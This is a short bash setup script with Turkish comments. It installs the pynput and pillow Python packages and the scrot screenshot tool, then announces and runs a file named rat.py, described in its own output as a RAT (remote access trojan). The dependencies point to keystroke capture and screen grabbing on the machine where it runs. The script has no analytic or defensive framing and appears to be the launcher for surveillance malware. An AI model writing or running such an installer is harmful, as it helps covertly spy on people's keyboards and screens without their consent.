#!/bin/bash

# Gerekli kütüphaneleri kurma
echo "[*] Gerekli kütüphaneler kuruluyor..."

# Python paketlerini yükleme
pip3 install pynput pillow

# Eğer scrot (Linux ekran görüntüsü alma aracı) yüklü değilse, onu yükleyelim
if ! command -v scrot &> /dev/null
then
    echo "[*] Scrot yüklü değil, yükleniyor..."
    sudo apt-get install scrot -y
fi

# Python dosyasını çalıştırma
echo "[*] RAT başlatılıyor..."
python3 rat.py

